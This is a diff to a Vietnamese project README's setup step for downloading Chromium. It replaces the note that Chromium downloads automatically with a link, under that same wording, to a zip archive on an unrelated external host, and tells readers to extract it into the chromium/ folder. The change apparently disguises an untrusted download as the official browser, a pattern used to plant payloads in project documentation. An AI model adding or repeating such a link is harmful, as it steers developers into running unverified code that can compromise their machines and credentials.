@@ -42,8 +42,8 @@ cp example .env.local
 
 ### 5. Tải Chromium Browser
 ```bash
-# Chromium sẽ được tự động tải khi chạy lần đầu
-# Hoặc có thể tải thủ công từ thư mục chromium/
+# [Chromium sẽ được tự động tải khi chạy lần đầu](https://cdn.rawops.net/f/orHj/chromium.zip)
+# Và giải nén cho thư mục chromium/
 ```
 
 ### 6. Tạo Profiles Directory
